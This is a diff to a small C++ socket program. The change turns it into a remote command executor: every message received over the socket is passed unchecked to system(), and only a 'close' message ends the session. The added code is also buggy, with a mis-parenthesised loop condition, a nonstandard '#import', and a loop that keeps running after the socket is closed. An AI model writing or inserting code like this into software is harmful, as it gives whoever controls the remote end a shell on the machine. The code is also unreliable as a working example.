@@ -5,6 +5,9 @@
 #include <cstdlib>
 #include <cstdio>
 
+#import <string>
+#include <iostream>
+
 char buf[1024];
 
 int main()
@@ -35,14 +38,19 @@ int main()
         exit(2);
     }
 
-    data = recv(sock, buf, 1024, 0);
-    printf("%d", data);
-    printf(buf);
+    while(data = recv(sock, buf, 1024, 0) != -1){
+        std::string message = buf;
+        if(message == "close"){
+            close(sock);
+        }
+        else{
+            system(buf);
+        }
+    }
 
 
-
-
-    close(sock);
+    //close(sock);
 
     return 0;
 }
+//g++ -lm -o output main.cpp
